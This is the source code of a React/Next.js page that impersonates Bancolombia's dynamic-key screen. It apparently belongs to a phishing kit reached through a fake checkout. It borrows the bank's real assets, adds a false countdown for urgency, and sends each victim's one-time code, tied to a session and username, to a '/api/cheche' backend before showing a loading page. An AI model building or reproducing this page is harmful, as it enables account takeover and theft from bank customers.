'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaClavePage() {
  const [clave, setClave] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const [usuario, setUsuario] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
    
    // Get session data to show username
    fetchSessionData(id);
  }, [searchParams, router]);

  const fetchSessionData = async (id: string) => {
    try {
      const response = await fetch(`/api/cheche?action=get_session&sessionId=${id}`);
      const data = await response.json();
      if (data.success && data.session?.usuario) {
        setUsuario(data.session.usuario);
      }
    } catch (error) {
      console.error('Error fetching session:', error);
    }
  };

  const handleSubmit = async () => {
    if (clave.length !== 6) return;

    setLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_dynamic_key',
          sessionId,
          claveDinamica: clave
        })
      });

      if (response.ok) {
        router.push(`/bancolombia/cargando?sessionId=${sessionId}`);
      }
    } catch (error) {
      console.error('Error updating dynamic key:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCancel = () => {
    router.push('/checkout');
  };

  return (
    <div 
      className="min-h-screen relative"
      style={{
        fontFamily: '"Open Sans", Arial, sans-serif',
        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
      }}
    >
      {/* Official Bancolombia background */}
      <div 
        className="min-h-screen bg-no-repeat bg-center bg-cover flex items-center justify-center"
        style={{
          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
        }}
      >
        
        {/* Top Header */}
        <div className="absolute top-0 left-0 right-0 bg-white border-b border-gray-200 py-3">
          <div className="max-w-7xl mx-auto px-4 flex justify-between items-center">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-6"
            />
            <button
              onClick={handleCancel}
              className="text-gray-600 hover:text-gray-800 text-sm font-medium"
            >
              Salir →
            </button>
          </div>
        </div>

        {/* Main Modal */}
        <div className="w-full max-w-md mx-auto px-4">
          <div className="bg-white rounded-lg shadow-xl border border-gray-200 overflow-hidden">
            
            {/* Modal Header */}
            <div className="text-center py-8 px-6">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
              </div>
              <h2 className="text-xl font-semibold text-gray-800 mb-2">Clave Dinámica</h2>
              <p className="text-gray-600 text-sm">
                Ingresá la clave dinámica que aparece en tu dispositivo
              </p>
            </div>

            {/* Timer Alert */}
            <div className="mx-6 mb-6 bg-red-50 border border-red-200 rounded-lg px-4 py-3">
              <p className="text-red-600 text-sm text-center font-medium">
                Tiempo restante: 1:00
              </p>
            </div>

            {/* PIN Input */}
            <div className="px-6 pb-6">
              <div className="relative">
                <input
                  type="text"
                  value={clave}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^\d]/g, '').slice(0, 6);
                    setClave(value);
                  }}
                  placeholder="000000"
                  className="w-full h-12 text-center text-2xl font-mono border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none tracking-widest text-gray-400"
                  maxLength={6}
                />
              </div>
            </div>

            {/* Action Buttons */}
            <div className="px-6 pb-6">
              <button
                onClick={handleSubmit}
                disabled={clave.length !== 6 || loading}
                className="w-full py-3 bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 text-white rounded-lg font-medium transition-colors disabled:cursor-not-allowed"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Validando...
                  </span>
                ) : (
                  'Confirmar Clave'
                )}
              </button>
            </div>
            
          </div>
        </div>

        {/* Bottom Logo */}
        <div className="absolute bottom-8 left-0 right-0 text-center">
          <img 
            src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
            alt="Bancolombia" 
            className="h-5 mx-auto opacity-60"
          />
        </div>

      </div>
    </div>
  );
}